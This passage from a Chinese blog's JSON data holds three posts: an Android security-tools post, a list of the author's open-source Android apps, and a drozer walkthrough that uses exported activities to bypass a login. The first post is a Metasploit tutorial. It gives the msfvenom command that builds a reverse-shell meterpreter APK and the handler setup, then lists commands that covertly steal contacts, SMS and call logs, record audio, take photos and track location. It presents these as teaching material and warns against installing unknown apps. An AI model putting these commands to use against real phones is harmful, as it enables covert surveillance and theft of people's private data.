id=\"webcam-list-检测摄像头\"><a href=\"#webcam-list-检测摄像头\" class=\"headerlink\" title=\"webcam_list(检测摄像头)\"></a>webcam_list(检测摄像头)</h5><blockquote>\n<p><img src=\"/images/pasted-26.png\" alt><br>2:前置摄像头<br>1:后置摄像头</p>\n</blockquote>\n<h5 id=\"webcam-snap-拍照\"><a href=\"#webcam-snap-拍照\" class=\"headerlink\" title=\"webcam_snap(拍照)\"></a>webcam_snap(拍照)</h5><blockquote>\n<ul>\n<li>-i 选择使用哪个摄像头拍照<br>手机息屏的时候也可以拍照<br><img src=\"/images/pasted-27.png\" alt></li>\n</ul>\n</blockquote>\n<h5 id=\"webcam-stream-连续拍照\"><a href=\"#webcam-stream-连续拍照\" class=\"headerlink\" title=\"webcam_stream(连续拍照)\"></a>webcam_stream(连续拍照)</h5><blockquote>\n<ul>\n<li>-i 指定摄像头</li>\n<li>-d 拍照间隔(默认1800毫秒)<br>使用目标手机摄像头连续拍照。会生成一个html文件,打开html，查看连续拍照照片<br><img src=\"/images/pasted-28.png\" alt></li>\n</ul>\n</blockquote>\n<h5 id=\"geolocate-获取地理位置\"><a href=\"#geolocate-获取地理位置\" class=\"headerlink\" title=\"geolocate(获取地理位置)\"></a>geolocate(获取地理位置)</h5><blockquote>\n<p><img src=\"/images/pasted-29.png\" alt></p>\n</blockquote>\n<h5 id=\"upload-上传文件到手机\"><a href=\"#upload-上传文件到手机\" class=\"headerlink\" title=\"upload(上传文件到手机)\"></a>upload(上传文件到手机)</h5><blockquote>\n<p><img src=\"/images/pasted-30.png\" alt></p>\n</blockquote>\n<h5 id=\"download-下载文件到手机\"><a href=\"#download-下载文件到手机\" class=\"headerlink\" title=\"download(下载文件到手机)\"></a>download(下载文件到手机)</h5><blockquote>\n<p><img src=\"/images/pasted-31.png\" alt></p>\n</blockquote>\n<h5 id=\"shell-进入手机bash-shell\"><a href=\"#shell-进入手机bash-shell\" class=\"headerlink\" title=\"shell(进入手机bash shell)\"></a>shell(进入手机bash shell)</h5><blockquote>\n<p><img src=\"/images/pasted-32.png\" alt></p>\n</blockquote>\n<h3 id=\"最后\"><a href=\"#最后\" class=\"headerlink\" title=\"最后\"></a>最后</h3><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这些操作都是可以在不用接触手机，而且手机也不会有任何提示下完成。所以同学们最好不要安装来历不明的app，后患无穷。</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><blockquote>\n<font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></font>\n</blockquote>\n<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msf原名Metasploit是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供真正的安全风险情报。这些功能包括智能开发，代码审计，Web应用程序扫描，社会工程","more":"。团队合作，在Metasploit和综合报告提出了他们的发现。</p>\n</blockquote>\n<h3 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h3><blockquote>\n<ul>\n<li>BackBox、kali linux、或者BackTrack(kali linux的前身)</li>\n<li>一台安卓设备</li>\n</ul>\n</blockquote>\n<blockquote>\n<p>环境不说太多介绍了，直接来实战。</p>\n</blockquote>\n<h3 id=\"生成payload\"><a href=\"#生成payload\" class=\"headerlink\" title=\"生成payload\"></a>生成payload</h3><blockquote>\n<p>装好环境后查看自己的ip<br><img src=\"/images/pasted-10.png\" alt></p>\n</blockquote>\n<blockquote>\n<p>生成一个payload</p>\n<pre><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=your_ip LPORT=your_port R &gt; /root/apk.apk\n</code></pre><ul>\n<li>p 设置要使用的payload</li>\n<li>LHOST 设置用来接收反弹连接的主机</li>\n<li>LPORT 设置用来接收反弹连接的端口</li>\n</ul>\n</blockquote>\n<p><img src=\"/images/pasted-11.png\" alt></p>\n<blockquote>\n<p>很小，才8kb<br>如果用的BackTrack，里面的msf是旧版本的了。旧版本的生成payload是msfpayload。<br>生成的apk放到手机上安装，安装完成后是这样的。<br><img src=\"/images/pasted-12.png\" alt></p>\n</blockquote>\n<h3 id=\"反弹shell\"><a href=\"#反弹shell\" class=\"headerlink\" title=\"反弹shell\"></a>反弹shell</h3><blockquote>\n<p>启动msf<br><img src=\"/images/pasted-13.png\" alt><br>依次输入命令来设置paylod和反弹的ip以及反弹端口(ip和端口必须和生成payload时候的一致)</p>\n<pre><code>* use exploit/multi/handler\n* set payload android/meterpreter/reverse_tcp\n* set LHOST 192.168.0.18 \n* set LPORT 2333\n</code></pre><p><img src=\"/images/pasted-14.png\" alt><br>设置完毕后就可以输入 <code>exploit</code> 来执行攻击了<br><img src=\"/images/pasted-15.png\" alt></p>\n</blockquote>\n<blockquote>\n<p>可以看到msf会一直在监听本机的2333端口，等待着目标连接上线<br>然后我打开我们刚刚安装的<br>打开后会连接到msf<br><img src=\"/images/pasted-16.png\" alt><br><img src=\"/images/pasted-17.png\" alt><br>这样我们就拿到了手机的shell</p>\n</blockquote>\n<h3 id=\"控制指令\"><a href=\"#控制指令\" class=\"headerlink\" title=\"控制指令\"></a>控制指令</h3><blockquote>\n<p>我来介绍几个有意思的指令。</p>\n<pre><code>* check_root    #查看是否root\n* dump_calllog    #下载通讯记录\n* dump_contacts    #下载联系人\n* dump_sms        #下载短信\n* send_sms        #发送短信\n* record_mic    #录音\n* webcam_list    #查看手机摄像头\n* webcam_snap    #拍照\n* webcam_stream    #连续拍照\n* geolocate        #获取目标地理位置\n* upload        #上传文件到手机\n* download        #下载手机上的文件\n* shell            #进入手机的bash shell\n</code></pre></blockquote>\n<h5 id=\"check-root-检测root\"><a href=\"#check-root-检测root\" class=\"headerlink\" title=\"check_root(检测root)\"></a>check_root(检测root)</h5><blockquote>\n<p><img src=\"/images/pasted-18.png\" alt><br>是root的设备</p>\n</blockquote>\n<h5 id=\"dump-contacts-下载联系人\"><a href=\"#dump-contacts-下载联系人\" class=\"headerlink\" title=\"dump_contacts(下载联系人)\"></a>dump_contacts(下载联系人)</h5><blockquote>\n<p><img src=\"/images/pasted-19.png\" alt><br>57个联系人<br><img src=\"/images/pasted-20.png\" alt></p>\n</blockquote>\n<h5 id=\"dump-sms-下载短信\"><a href=\"#dump-sms-下载短信\" class=\"headerlink\" title=\"dump_sms(下载短信)\"></a>dump_sms(下载短信)</h5><blockquote>\n<p><img src=\"/images/pasted-21.png\" alt><br>1271条短信<br><img src=\"/images/pasted-22.png\" alt></p>\n</blockquote>\n<h5 id=\"send-sms-发送短信\"><a href=\"#send-sms-发送短信\" class=\"headerlink\" title=\"send_sms(发送短信)\"></a>send_sms(发送短信)</h5><blockquote>\n<ul>\n<li>-d目标电话号码</li>\n<li>-t 短信内容<br><img src=\"/images/pasted-23.png\" alt><br><img src=\"/images/pasted-24.png\" alt></li>\n</ul>\n</blockquote>\n<h5 id=\"record-mic-录音\"><a href=\"#record-mic-录音\" class=\"headerlink\" title=\"record_mic(录音)\"></a>record_mic(录音)</h5><blockquote>\n<ul>\n<li>-d 录音的秒数<br>音频文件会自动保存在/var/www/html/目录下<br><img src=\"/images/pasted-25.png\" alt></li>\n</ul>\n</blockquote>\n<h5 id=\"webcam-list-检测摄像头\"><a href=\"#webcam-list-检测摄像头\" class=\"headerlink\" title=\"webcam_list(检测摄像头)\"></a>webcam_list(检测摄像头)</h5><blockquote>\n<p><img src=\"/images/pasted-26.png\" alt><br>2:前置摄像头<br>1:后置摄像头</p>\n</blockquote>\n<h5 id=\"webcam-snap-拍照\"><a href=\"#webcam-snap-拍照\" class=\"headerlink\" title=\"webcam_snap(拍照)\"></a>webcam_snap(拍照)</h5><blockquote>\n<ul>\n<li>-i 选择使用哪个摄像头拍照<br>手机息屏的时候也可以拍照<br><img src=\"/images/pasted-27.png\" alt></li>\n</ul>\n</blockquote>\n<h5 id=\"webcam-stream-连续拍照\"><a href=\"#webcam-stream-连续拍照\" class=\"headerlink\" title=\"webcam_stream(连续拍照)\"></a>webcam_stream(连续拍照)</h5><blockquote>\n<ul>\n<li>-i 指定摄像头</li>\n<li>-d 拍照间隔(默认1800毫秒)<br>使用目标手机摄像头连续拍照。会生成一个html文件,打开html，查看连续拍照照片<br><img src=\"/images/pasted-28.png\" alt></li>\n</ul>\n</blockquote>\n<h5 id=\"geolocate-获取地理位置\"><a href=\"#geolocate-获取地理位置\" class=\"headerlink\" title=\"geolocate(获取地理位置)\"></a>geolocate(获取地理位置)</h5><blockquote>\n<p><img src=\"/images/pasted-29.png\" alt></p>\n</blockquote>\n<h5 id=\"upload-上传文件到手机\"><a href=\"#upload-上传文件到手机\" class=\"headerlink\" title=\"upload(上传文件到手机)\"></a>upload(上传文件到手机)</h5><blockquote>\n<p><img src=\"/images/pasted-30.png\" alt></p>\n</blockquote>\n<h5 id=\"download-下载文件到手机\"><a href=\"#download-下载文件到手机\" class=\"headerlink\" title=\"download(下载文件到手机)\"></a>download(下载文件到手机)</h5><blockquote>\n<p><img src=\"/images/pasted-31.png\" alt></p>\n</blockquote>\n<h5 id=\"shell-进入手机bash-shell\"><a href=\"#shell-进入手机bash-shell\" class=\"headerlink\" title=\"shell(进入手机bash shell)\"></a>shell(进入手机bash shell)</h5><blockquote>\n<p><img src=\"/images/pasted-32.png\" alt></p>\n</blockquote>\n<h3 id=\"最后\"><a href=\"#最后\" class=\"headerlink\" title=\"最后\"></a>最后</h3><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这些操作都是可以在不用接触手机，而且手机也不会有任何提示下完成。所以同学们最好不要安装来历不明的app，后患无穷。</p>\n</blockquote>"},{"layout":"post","title":"安卓源码三连发","date":"2017-01-06T06:11:27.000Z","comments":1,"_content":"\n## 前言\n>早在高三的时候,我就决定不再弄啥网络安全了,想从事开发的工作.\n>当时正好移动设备特别火,所以决定入坑安卓开发了.\n>当时给自己定下的目标是先学习java，javaweb，然后是android.\n\n>学习期间自己也试着开发了几个项目，这里开源出来和大家分享一下，希望能和大家共同学习.\n\n\n>* 手机安全卫士<!--more-->\n     https://github.com/Y00z/android_security\n>* 新闻客户端\n\t https://github.com/Y00z/android_news\n>* 应用市场\n\t https://github.com/Y00z/android_googlePlay\n\n\n## 尾声\n>移动开发从火爆到现在，个人觉得现在的安卓原生已经完全饱和了.\n>门槛不高，第三方框架和解决方案太多太多了.\n>个人目前正在学习研究nodejs，react，react-native，python.\n>欢迎志向相同的朋友交流一起学习","source":"_posts/diary-2017-0106-01.md","raw":"---\nlayout: post\ntitle: 安卓源码三连发\ndate: 2017-01-06 14:11:27\ncomments: true\ntags:\n\t- 开源\n\t- 安卓\n---\n\n## 前言\n>早在高三的时候,我就决定不再弄啥网络安全了,想从事开发的工作.\n>当时正好移动设备特别火,所以决定入坑安卓开发了.\n>当时给自己定下的目标是先学习java，javaweb，然后是android.\n\n>学习期间自己也试着开发了几个项目，这里开源出来和大家分享一下，希望能和大家共同学习.\n\n\n>* 手机安全卫士<!--more-->\n     https://github.com/Y00z/android_security\n>* 新闻客户端\n\t https://github.com/Y00z/android_news\n>* 应用市场\n\t https://github.com/Y00z/android_googlePlay\n\n\n## 尾声\n>移动开发从火爆到现在，个人觉得现在的安卓原生已经完全饱和了.\n>门槛不高，第三方框架和解决方案太多太多了.\n>个人目前正在学习研究nodejs，react，react-native，python.\n>欢迎志向相同的朋友交流一起学习","slug":"diary-2017-0106-01","published":1,"updated":"2017-06-21T10:52:51.002Z","photos":[],"link":"","_id":"cjvhjxaaj0006iny2y7oxwejz","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><blockquote>\n<p>早在高三的时候,我就决定不再弄啥网络安全了,想从事开发的工作.<br>当时正好移动设备特别火,所以决定入坑安卓开发了.<br>当时给自己定下的目标是先学习java，javaweb，然后是android.</p>\n</blockquote>\n<blockquote>\n<p>学习期间自己也试着开发了几个项目，这里开源出来和大家分享一下，希望能和大家共同学习.</p>\n</blockquote>\n<blockquote>\n<ul>\n<li>手机安全卫士<a id=\"more\"></a><br>   <a href=\"https://github.com/Y00z/android_security\" target=\"_blank\" rel=\"noopener\">https://github.com/Y00z/android_security</a></li>\n<li>新闻客户端<br>   <a href=\"https://github.com/Y00z/android_news\" target=\"_blank\" rel=\"noopener\">https://github.com/Y00z/android_news</a></li>\n<li>应用市场<br>   <a href=\"https://github.com/Y00z/android_googlePlay\" target=\"_blank\" rel=\"noopener\">https://github.com/Y00z/android_googlePlay</a></li>\n</ul>\n</blockquote>\n<h2 id=\"尾声\"><a href=\"#尾声\" class=\"headerlink\" title=\"尾声\"></a>尾声</h2><blockquote>\n<p>移动开发从火爆到现在，个人觉得现在的安卓原生已经完全饱和了.<br>门槛不高，第三方框架和解决方案太多太多了.<br>个人目前正在学习研究nodejs，react，react-native，python.<br>欢迎志向相同的朋友交流一起学习</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><blockquote>\n<p>早在高三的时候,我就决定不再弄啥网络安全了,想从事开发的工作.<br>当时正好移动设备特别火,所以决定入坑安卓开发了.<br>当时给自己定下的目标是先学习java，javaweb，然后是android.</p>\n</blockquote>\n<blockquote>\n<p>学习期间自己也试着开发了几个项目，这里开源出来和大家分享一下，希望能和大家共同学习.</p>\n</blockquote>\n<blockquote>\n<ul>\n<li>手机安全卫士","more":"<br>   <a href=\"https://github.com/Y00z/android_security\" target=\"_blank\" rel=\"noopener\">https://github.com/Y00z/android_security</a></li>\n<li>新闻客户端<br>   <a href=\"https://github.com/Y00z/android_news\" target=\"_blank\" rel=\"noopener\">https://github.com/Y00z/android_news</a></li>\n<li>应用市场<br>   <a href=\"https://github.com/Y00z/android_googlePlay\" target=\"_blank\" rel=\"noopener\">https://github.com/Y00z/android_googlePlay</a></li>\n</ul>\n</blockquote>\n<h2 id=\"尾声\"><a href=\"#尾声\" class=\"headerlink\" title=\"尾声\"></a>尾声</h2><blockquote>\n<p>移动开发从火爆到现在，个人觉得现在的安卓原生已经完全饱和了.<br>门槛不高，第三方框架和解决方案太多太多了.<br>个人目前正在学习研究nodejs，react，react-native，python.<br>欢迎志向相同的朋友交流一起学习</p>\n</blockquote>"},{"layout":"post","title":"drozer对app安全测试","date":"2017-02-04T03:44:08.000Z","comments":1,"_content":"\n#### 前言\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最近发现一款不错的Android安全测试框架\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其官方文档说道：“Drozer允许你一一个普通android应用的身份与其他应用和操作系统交互。”\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在Web世界已经有了许多安全测试工具了，我们只需要给出一个目标，这些工具就会自动为我们安全测试报告。但Drozer与这样的自动化扫描器不同，Drozer是一种交互式的安全测试工具。使用Drozer进行安全测试，用户在自己的工作站上输入命令，Drozer会将命令发送到Android设备上的代理程序执行。\n\n#### 配置环境 <!--more-->\n> 电脑和手机都需要安装drozer\n> 下载地址\n> https://www.mwrinfosecurity.com/products/drozer/community-edition/\n> 我电脑是windows的，安装完毕后，dos切换到drozer安装目录。\n> ![](/images/pasted-33.png)\n\n###### 连接手机\n> 然后手机上安装好drozer并且开启server默认端口31415\n> \n> ![](/images/pasted-34.jpg)\n>然后手机打开调试usb连接电脑，\n>输入指令做端口转发 `adb forward tcp:31415 tcp:31415`\n>必须在`adb devices` 有显示手机设备才可以。\n>dos中，在drozer安装目录输入指令  \n> `drozer console connect`\n> ![](/images/pasted-34.png)\n> 连接成功了。\n\n\n#### 功能介绍\n\n###### 所有的模块\n> * list \n> 查看框架所有的模块\n> ![](/images/pasted-35.png)\n> * run app.package.list\n> 列出手机上所有应用包名\n\n###### 查看包名\n> * run app.package.list\n> ![](/images/pasted-36.png)\n> ps: 为了一些有心人士,所以打了码,不好意思。\n> 加上-f参数，搜索特定包名支持模糊搜索：\n> * run app.package.list -f (string to be searched)\n> ![](/images/pasted-37.png)\n\n###### 查看包详情\n>* run app.package.info –a (package name)\n> ![](/images/pasted-38.png)\n\n###### 扫描攻击面\n>扫描指定app的攻击面。\n> * run app.package.attacksurface (package name)\n> ![](/images/pasted-39.png)\n> 可以看到有3个暴露的activity，现在我们需要找出暴露activity的名字并检查是否有敏感信息\n\n###### 查看暴露的页面\n> * run app.activity.info –a (package name)\n> ![](/images/pasted-40.png)\n> 如果暴露的页面是需要登录之后获取一些操作之后才能看到的页面。那么用drozer绕过登录认证，直接打开这个页面。\n\n\n###### 打开暴露的页面\n> * run app.activity.start --component (package name) (activity name)\n> ![](/images/pasted-41.png)\n>会直接启动该activity。\n> ![](/images/pasted-42.png)\n> 就这样我们成功绕过了登录认证。\n> 由于我在页面写了检测到如果没有登录，就重新跳到登录页面，所以有弹出框。\n\n#### 漏洞原因\n>在AndroidManifest.xml中activity有一个属性android:exported，当这个属性为true的时候，表示该组件可以被其他组件调用。所以直接不写这个属性就可以了，默认false。\n>ps:其实这个app本来是没这个属性，我为了方便演示才加上的。","source":"_posts/diary-2017-0204-01.md","raw":"---\nlayout: post\ntitle: drozer对app安全测试\ndate: 2017-02-04 11:44:08\ncomments: true\ntags:\n\t- 安卓\n\t- 安全攻防\n---\n\n#### 前言\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最近发现一款不错的Android安全测试框架\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其官方文档说道：“Drozer允许你一一个普通android应用的身份与其他应用和操作系统交互。”\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在Web世界已经有了许多安全测试工具了，我们只需要给出一个目标，这些工具就会自动为我们安全测试报告。但Drozer与这样的自动化扫描器不同，Drozer是一种交互式的安全测试工具。使用Drozer进行安全测试，用户在自己的工作站上输入命令，Drozer会将命令发送到Android设备上的代理程序执行。\n\n#### 配置环境 <!--more-->\n> 电脑和手机都需要安装drozer\n> 下载地址\n> https://www.mwrinfosecurity.com/products/drozer/community-edition/\n> 我电脑是windows的，安装完毕后，dos切换到drozer安装目录。\n> ![](/images/pasted-33.png)\n\n###### 连接手机\n> 然后手机上安装好drozer并且开启server默认端口31415\n> \n> ![](/images/pasted-34.jpg)\n>然后手机打开调试usb连接电脑，\n>输入指令做端口转发 `adb forward tcp:31415 tcp:31415`\n>必须在`adb devices` 有显示手机设备才可以。\n>dos中，在drozer安装目录输入指令  \n> `drozer console connect`\n> ![](/images/pasted-34.png)\n> 连接成功了。\n\n\n#### 功能介绍\n\n###### 所有的模块\n> * list \n> 查看框架所有的模块\n> ![](/images/pasted-35.png)\n> * run app.package.list\n> 列出手机上所有应用包名\n\n###### 查看包名\n> * run app.package.list\n> ![](/images/pasted-36.png)\n> ps: 为了一些有心人士,所以打了码,不好意思。\n> 加上-f参数，搜索特定包名支持模糊搜索：\n> * run app.package.list -f (string to be searched)\n> ![](/images/pasted-37.png)\n\n###### 查看包详情\n>* run app.package.info –a (package name)\n> ![](/images/pasted-38.png)\n\n###### 扫描攻击面\n>扫描指定app的攻击面。\n> * run app.package.attacksurface (package name)\n> ![](/images/pasted-39.png)\n> 可以看到有3个暴露的activity，现在我们需要找出暴露activity的名字并检查是否有敏感信息\n\n###### 查看暴露的页面\n> * run app.activity.info –a (package name)\n> ![](/images/pasted-40.png)\n> 如果暴露的页面是需要登录之后获取一些操作之后才能看到的页面。那么用drozer绕过登录认证，直接打开这个页面。\n\n\n###### 打开暴露的页面\n> * run app.activity.start --component (package name) (activity name)\n> ![](/images/pasted-41.png)\n>会直接启动该activity。\n> ![](/images/pasted-42.png)\n> 就这样我们成功绕过了登录认证。\n> 由于我在页面写了检测到如果没有登录，就重新跳到登录页面，所以有弹出框。\n\n#### 漏洞原因\n>在AndroidManifest.xml中activity有一个属性android:exported，当这个属性为true的时候，表示该组件可以被其他组件调用。所以直接不写这个属性就可以了，默认false。\n>ps:其实这个app本来是没这个属性，我为了方便演示才加上的。","slug":"diary-2017-0204-01","published":1,"updated":"2017-02-04T13:08:23.842Z","photos":[],"link":"","_id":"cjvhjxaak0007iny2sy0acj94","content":"<h4 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h4><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最近发现一款不错的Android安全测试框架<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其官方文档说道：“Drozer允许你一一个普通android应用的身份与其他应用和操作系统交互。”<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在Web世界已经有了许多安全测试工具了，我们只需要给出一个目标，这些工具就会自动为我们安全测试报告。但Drozer与这样的自动化扫描器不同，Drozer是一种交互式的安全测试工具。使用Drozer进行安全测试，用户在自己的工作站上输入命令，Drozer会将命令发送到Android设备上的代理程序执行。</p>\n</blockquote>\n<h4 id=\"配置环境\"><a href=\"#配置环境\" class=\"headerlink\" title=\"配置环境 \"></a>配置环境 <a id=\"more\"></a></h4><blockquote>\n<p>电脑和手机都需要安装drozer<br>下载地址<br><a href=\"https://www.mwrinfosecurity.com/products/drozer/community-edition/\" target=\"_blank\" rel=\"noopener\">https://www.mwrinfosecurity.com/products/drozer/community-edition/</a><br>我电脑是windows的，安装完毕后，dos切换到drozer安装目录。<br><img src=\"/images/pasted-33.png\" alt></p>\n</blockquote>\n<h6 id=\"连接手机\"><a href=\"#连接手机\" class=\"headerlink\" title=\"连接手机\"></a>连接手机</h6><blockquote>\n<p>然后手机上安装好drozer并且开启server默认端口31415</p>\n<p><img src=\"/images/pasted-34.jpg\" alt><br>然后手机打开调试usb连接电脑，<br>输入指令做端口转发 <code>adb forward tcp:31415 tcp:31415</code><br>必须在<code>adb devices</code> 有显示手机设备才可以。<br>dos中，在drozer安装目录输入指令<br><code>drozer console connect</code><br><img src=\"/images/pasted-34.png\" alt><br>连接成功了。</p>\n</blockquote>\n<h4 id=\"功能介绍\"><a href=\"#功能介绍\" class=\"headerlink\" title=\"功能介绍\"></a>功能介绍</h4><h6 id=\"所有的模块\"><a href=\"#所有的模块\" class=\"headerlink\" title=\"所有的模块\"></a>所有的模块</h6><blockquote>\n<ul>\n<li>list<br>查看框架所有的模块<br><img src=\"/images/pasted-35.png\" alt></li>\n<li>run app.package.list<br>列出手机上所有应用包名</li>\n</ul>\n</blockquote>\n<h6 id=\"查看包名\"><a href=\"#查看包名\" class=\"headerlink\" title=\"查看包名\"></a>查看包名</h6><blockquote>\n<ul>\n<li>run app.package.list<br><img src=\"/images/pasted-36.png\" alt><br>ps: 为了一些有心人士,所以打了码,不好意思。<br>加上-f参数，搜索特定包名支持模糊搜索：</li>\n<li>run app.package.list -f (string to be searched)<br><img src=\"/images/pasted-37.png\" alt></li>\n</ul>\n</blockquote>\n<h6 id=\"查看包详情\"><a href=\"#查看包详情\" class=\"headerlink\" title=\"查看包详情\"></a>查看包详情</h6><blockquote>\n<ul>\n<li>run app.package.info –a (package name)<br><img src=\"/images/pasted-38.png\" alt></li>\n</ul>\n</blockquote>\n<h6 id=\"扫描攻击面\"><a href=\"#扫描攻击面\" class=\"headerlink\" title=\"扫描攻击面\"></a>扫描攻击面</h6><blockquote>\n<p>扫描指定app的攻击面。</p>\n<ul>\n<li>run app.package.attacksurface (package name)<br><img src=\"/images/pasted-39.png\" alt><br>可以看到有3个暴露的activity，现在我们需要找出暴露activity的名字并检查是否有敏感信息</li>\n</ul>\n</blockquote>\n<h6 id=\"查看暴露的页面\"><a href=\"#查看暴露的页面\" class=\"headerlink\" title=\"查看暴露的页面\"></a>查看暴露的页面</h6><blockquote>\n<ul>\n<li>run app.activity.info –a (package name)<br><img src=\"/images/pasted-40.png\" alt><br>如果暴露的页面是需要登录之后获取一些操作之后才能看到的页面。那么用drozer绕过登录认证，直接打开这个页面。</li>\n</ul>\n</blockquote>\n<h6 id=\"打开暴露的页面\"><a href=\"#打开暴露的页面\" class=\"headerlink\" title=\"打开暴露的页面\"></a>打开暴露的页面</h6><blockquote>\n<ul>\n<li>run app.activity.start –component (package name) (activity name)<br><img src=\"/images/pasted-41.png\" alt><br>会直接启动该activity。<br><img src=\"/images/pasted-42.png\" alt><br>就这样我们成功绕过了登录认证。<br>由于我在页面写了检测到如果没有登录，就重新跳到登录页面，所以有弹出框。</li>\n</ul>\n</blockquote>\n<h4 id=\"漏洞原因\"><a href=\"#漏洞原因\" class=\"headerlink\" title=\"漏洞原因\"></a>漏洞原因</h4><blockquote>\n<p>在AndroidManifest.xml中activity有一个属性android:exported，当这个属性为true的时候，表示该组件可以被其他组件调用。所以直接不写这个属性就可以了，默认false。<br>ps:其实这个app本来是没这个属性，我为了方便演示才加上的。</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"<h4 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h4><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最近发现一款不错的Android安全测试框架<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其官方文档说道：“Drozer允许你一一个普通android应用的身份与其他应用和操作系统交互。”<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在Web世界已经有了许多安全测试工具了，我们只需要给出一个目标，这些工具就会自动为我们安全测试报告。但Drozer与这样的自动化扫描器不同，Drozer是一种交互式的安全测试工具。使用Drozer进行安全测试，用户在自己的工作站上输入命令，Drozer会将命令发送到Android设备上的代理程序执行。</p>\n</blockquote>\n<h4 id=\"配置环境\"><a href=\"#配置环境\" class=\"headerlink\" title=\"配置环境 \"></a>配置环境","more":"</h4><blockquote>\n<p>电脑和手机都需要安装drozer<br>下载地址<br><a href=\"https://www.mwrinfosecurity.com/products/drozer/community-edition/\" target=\"_blank\" rel=\"noopener\">https://www.mwrinfosecurity.com/products/drozer/community-edition/</a><br>我电脑是windows的，安装完毕后，dos切换到drozer安装目录。<br><img src=\"/images/pasted-33.png\" alt></p>\n</blockquote>\n<h6 id=\"连接手机\"><a href=\"#连接手机\" class=\"headerlink\" title=\"连接手机\"></a>连接手机</h6><blockquote>\n<p>然后手机上安装好drozer并且开启server默认端口31415</p>\n<p><img src=\"/images/pasted-34.jpg\" alt><br>然后手机打开调试usb连接电脑，<br>输入指令做端口转发 <code>adb forward tcp:31415 tcp:31415</code><br>必须在<code>adb devices</code> 有显示手机设备才可以。<br>dos中，在drozer安装目录输入指令<br><code>drozer console connect</code><br><img src=\"/images/pasted-34.png\" alt><br>连接成功了。</p>\n</blockquote>\n<h4 id=\"功能介绍\"><a href=\"#功能介绍\" class=\"headerlink\" title=\"功能介绍\"></a>功能介绍</h4><h6 id=\"所有的模块\"><a href=\"#所有的模块\" class=\"headerlink\" title=\"所有的模块\"></a>所有的模块</h6><blockquote>\n<ul>\n<li>list<br>查看框架所有的模块<br><img src=\"/images/pasted-35.png\" alt></li>\n<li>run app.package.list<br>列出手机上所有应用包名</li>\n</ul>\n</blockquote>\n<h6 id=\"查看包名\"><a href=\"#查看包名\" class=\"headerlink\" title=\"查看包名\"></a>查看包名</h6><blockquote>\n<ul>\n<li>run app.package.list<br><img src=\"/images/pasted-36.png\" alt><br>ps: 为了一些有心人士,所以打了码,不好意思。<br>加上-f参数，搜索特定包名支持模糊搜索：</li>\n<li>run app.package.list -f (string to be searched)<br><img src=\"/images/pasted-37.png\" alt></li>\n</ul>\n</blockquote>\n<h6 id=\"查看包详情\"><a href=\"#查看包详情\" class=\"headerlink\" title=\"查看包详情\"></a>查看包详情</h6><blockquote>\n<ul>\n<li>run app.package.info –a (package name)<br><img src=\"/images/pasted-38.png\" alt></li>\n</ul>\n</blockquote>\n<h6 id=\"扫描攻击面\"><a href=\"#扫描攻击面\" class=\"headerlink\" title=\"扫描攻击面\"></a>扫描攻击面</h6><blockquote>\n<p>扫描指定app的攻击面。</p>\n<ul>\n<li>run app.package.attacksurface (package name)<br><img src=\"/images/pasted-39.png\" alt><br>可以看到有3个暴露的activity，现在我们需要找出暴露activity的名字并检查是否有敏感信息</li>\n</ul>\n</blockquote>\n<h6 id=\"查看暴露的页面\"><a href=\"#查看暴露的页面\" class=\"headerlink\" title=\"查看暴露的页面\"></a>查看暴露的页面</h6><blockquote>\n<ul>\n<li>run app.activity.info –a (package name)<br><img src=\"/images/pasted-40.png\" alt><br>如果暴露的页面是需要登录之后获取一些操作之后才能看到的页面。那么用drozer绕过登录认证，直接打开这个页面。</li>\n</ul>\n</blockquote>\n<h6 id=\"打开暴露的页面\"><a href=\"#打开暴露的页面\" class=\"headerlink\" title=\"打开暴露的页面\"></a>打开暴露的页面</h6><blockquote>\n<ul>\n<li>run app.activity.start –component (package name) (activity name)<br><img src=\"/images/pasted-41.png\" alt><br>会直接启动该activity。<br><img src=\"/images/pasted-42.png\" alt><br>就这样我们成功绕过了登录认证。<br>由于我在页面写了检测到如果没有登录，就重新跳到登录页面，所以有弹出框。</li>\n</ul>\n</blockquote>\n<h4 id=\"漏洞原因\"><a href=\"#漏洞原因\" class=\"headerlink\" 